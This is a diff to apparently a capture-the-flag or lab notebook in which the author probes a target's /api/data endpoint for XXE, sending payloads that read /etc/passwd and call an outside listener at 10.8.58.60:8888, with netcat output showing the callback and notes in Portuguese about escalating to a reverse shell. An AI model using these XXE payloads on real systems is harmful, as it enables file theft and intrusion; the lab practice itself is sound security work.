@@ -1,8 +1,10 @@
 #+title: Data Dome
 
 
+* intro
+According to information from our cyber security team, the computer of the manager of an organization we serve was infected with malware. Our malware analysis team identified a malware known as 'Stealer' malware. In addition, we found an IP address through which the malware was communicating. Your task is to collect information about the malware gang from this IP address.
 
-*
+* initial tests
 #+begin_src xml
 POST /api/data HTTP/1.1
 Host: 172.20.1.124
@@ -81,3 +83,51 @@ Content-Type: application/xml
 127.0.0.1
 </Data></Response>
 #+end_src
+
+More tests for XXE vulnerability
+#+begin_src sh
+POST /api/data HTTP/1.1
+Host: 172.20.10.99
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/xml
+Content-Length: 165
+
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://10.8.58.60:8888">
+  %dtd;
+]>
+<foo></foo>
+#+end_src
+
+*Result* ->
+#+begin_src sh
+[16:35][]~ ✮ nc -lvnp 8888
+Listening on 0.0.0.0 8888
+Connection received on 172.20.10.99 54334
+GET / HTTP/1.0
+Host: 10.8.58.60:8888
+#+end_src
+
+
+-----
+
+Com este payload estou recebendo a request em meu python server, preciso evoluir isto para algum tipo de shell, para então conseguir o reverse shell
+#+begin_src sh
+<?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://10.8.58.60:8888/p.dtd"> %dtd; %error; ]><foo></foo>
+#+end_src
+
+Tentando algo com ->
+#+begin_src sh
+<?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://10.8.58.60:8888/p.dtd"> %dtd; ]>
+<UserInformation><UserName>%error;</UserName><Country>BR</Country></UserInformation>
+#+end_src
+
+As requests chegam até o python server, porém estes payloads com dtd não estão funcionando ainda, vou continuar tentando nisso.
